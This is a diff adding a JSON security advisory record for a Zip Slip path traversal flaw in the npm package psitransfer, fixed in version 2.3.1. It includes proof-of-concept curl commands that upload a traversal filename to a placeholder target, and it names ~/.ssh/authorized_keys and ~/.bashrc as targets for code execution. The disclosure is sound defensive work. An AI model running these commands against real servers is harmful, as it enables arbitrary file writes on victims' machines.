@@ -1,0 +1,52 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2025-12-30T19:25:07Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "psitransfer"
+  },
+  "Advisory": {
+    "DatabaseId": 329342,
+    "Id": "GSA_kwCzR0hTQS14cGhoLTV2NHItcjNyeM4ABQZ-",
+    "GhsaId": "GHSA-xphh-5v4r-r3rx",
+    "References": [
+      {
+        "Url": "https://github.com/psi-4ward/psitransfer/security/advisories/GHSA-xphh-5v4r-r3rx"
+      },
+      {
+        "Url": "https://github.com/psi-4ward/psitransfer/commit/6c71bc0b8afa1ffa7aabd6c5fb28677651fd57b6"
+      },
+      {
+        "Url": "https://github.com/psi-4ward/psitransfer/releases/tag/v2.3.1"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-xphh-5v4r-r3rx"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-xphh-5v4r-r3rx"
+      }
+    ],
+    "Description": "### Summary\n\nA Zip Slip vulnerability in PsiTransfer allows an unauthenticated attacker to upload files with path traversal sequences in the filename (e.g. `../../../.ssh/authorized_keys`). When a victim downloads the bucket as a **.tar.gz** archive and extracts it, malicious files are written outside the intended directory, potentially leading to RCE.\n\n### Details\n\nThe vulnerability exists in the archive download functionality in **lib/endpoints.js** where user controlled metadata.name is used directly without sanitization when creating TAR archive entries.\n\n```\nlib/endpoints.js:275\n\nconst entry = pack.entry({ name: info.metadata.name, size: info.size });\n```\n\n```\nlib/endpoints.js:372\nassert(meta.name, 'tus meta prop missing: name');\n```\n\n### PoC\n\nI. Upload file with malicious filename (no authentication required).\n\n```\nMALICIOUS_NAME=$(echo -n \"../../../tmp/dp.txt\" | base64)\nSID=$(echo -n \"evil\" | base64)\nRETENTION=$(echo -n \"3600\" | base64)\n\ncurl -X POST http://TARGET:3000/files \\\n  -H \"Tus-Resumable: 1.0.0\" \\\n  -H \"Upload-Length: 15\" \\\n  -H \"Upload-Metadata: name ${MALICIOUS_NAME},sid ${SID},retention ${RETENTION}\"\n```\n\nII. Complete upload with PATCH\n\n```\ncurl -X PATCH \"http://TARGET:3000/files/evil++\u003cUUID\u003e\" \\\n  -H \"Tus-Resumable: 1.0.0\" \\\n  -H \"Upload-Offset: 0\" \\\n  -H \"Content-Type: application/offset+octet-stream\" \\\n  -d \"MALICIOUS_CONTENT\"\n```\n  \nIII. Victim downloads and extracts TAR\n\n```\ncurl \"http://TARGET:3000/files/evil++\u003cHASH\u003e.tar.gz\" -o files.tar.gz\ntar -tzf files.tar.gz\n```\n\n### Impact\n\nArbitrary File Write: Attacker can write files anywhere on victim's filesystem when they extract the archive.\nRCE: By targeting ~/.bashrc, ~/.ssh/authorized_keys, cron directories etc...\nNo Authentication Required: Default configuration has **uploadPass: false**.\nSocial Engineering Vector: Attacker sends malicious download link to victim.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-12-30T19:25:04Z",
+    "Severity": "HIGH",
+    "Summary": "PsiTransfer has Zip Slip Path Traversal via TAR Archive Download",
+    "UpdatedAt": "2025-12-30T19:25:07Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.1,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.3.1"
+      },
+      "VulnerableVersionRange": "\u003c 2.3.1"
+    }
+  ]
+}
